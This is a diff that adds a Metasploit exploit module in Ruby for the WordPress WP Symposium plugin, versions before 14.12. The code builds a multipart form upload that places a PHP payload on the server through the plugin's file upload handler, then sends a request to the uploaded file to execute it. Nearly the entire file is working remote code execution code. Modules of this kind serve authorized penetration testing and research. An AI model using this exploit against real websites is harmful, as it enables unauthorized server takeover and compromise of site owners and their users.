@@ -1,0 +1,99 @@
+##
+# This module requires Metasploit: http://www.metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::HTTP::Wordpress
+
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name'            => 'WordPress WP Symposium 14.11 Shell Upload',
+      'Description'     => %q{WP Symposium Plugin for WordPress contains a
+                              flaw that allows a remote attacker to execute
+                              arbitrary PHP code. This flaw exists because the
+                              /wp-symposium/server/file_upload_form.php script
+                              does not properly verify or sanitize
+                              user-uploaded files. By uploading a .php file,
+                              the remote system will place the file in a
+                              user-accessible path. Making a direct request to
+                              the uploaded file will allow the attacker to
+                              execute the script with the privileges of the
+                              web server.},
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Claudio Viviani',                # Vulnerability disclosure
+          'Rob Carr <rob[at]rastating.com>' # Metasploit module
+        ],
+      'References'      =>
+        [
+          ['OSVDB', '116046'],
+          ['WPVDB', '7716']
+        ],
+      'DisclosureDate'  => 'Dec 11 2014',
+      'Platform'        => 'php',
+      'Arch'            => ARCH_PHP,
+      'Targets'         => [['wp-symposium < 14.12', {}]],
+      'DefaultTarget'   => 0
+    ))
+  end
+
+  def check
+    check_plugin_version_from_readme('wp-symposium', '14.12')
+  end
+
+  def generate_mime_message(payload, payload_name, directory_name, symposium_url)
+    data = Rex::MIME::Message.new
+    data.add_part('1', nil, nil, 'form-data; name="uploader_uid"')
+    data.add_part("./#{directory_name}/", nil, nil, 'form-data; name="uploader_dir"')
+    data.add_part(symposium_url, nil, nil, 'form-data; name="uploader_url"')
+    data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"files[]\"; filename=\"#{payload_name}\"")
+    data
+  end
+
+  def exploit
+    print_status("#{peer} - Preparing payload")
+    unique_name = Rex::Text.rand_text_alpha(10)
+    payload_name = "#{unique_name}.php"
+    symposium_url = normalize_uri(wordpress_url_plugins, 'wp-symposium', 'server', 'php')
+    payload_url = normalize_uri(symposium_url, unique_name, payload_name)
+    data = generate_mime_message(payload, payload_name, unique_name, symposium_url)
+    symposium_url = normalize_uri(symposium_url, 'index.php')
+
+    print_status("#{peer} - Uploading payload to #{payload_url}")
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'uri'     => symposium_url,
+      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
+      'data'    => data.to_s
+    )
+
+    if res && res.code == 200 && res.body.length > 0 && !res.body.include?('error') && res.body != '0'
+      print_good("#{peer} - Uploaded the payload")
+      register_files_for_cleanup(payload_name)
+
+      print_status("#{peer} - Executing the payload...")
+      send_request_cgi(
+      {
+        'uri'     => payload_url,
+        'method'  => 'GET'
+      }, 5)
+      print_good("#{peer} - Executed payload")
+    else
+      if res.nil?
+        fail_with(Failure::Unreachable, "No response from the target")
+      else
+        vprint_error("#{peer} - HTTP Status: #{res.code}")
+        vprint_error("#{peer} - Server returned: #{res.body}")
+        fail_with(Failure::UnexpectedReply, "Failed to upload the payload")
+      end
+    end
+  end
+end
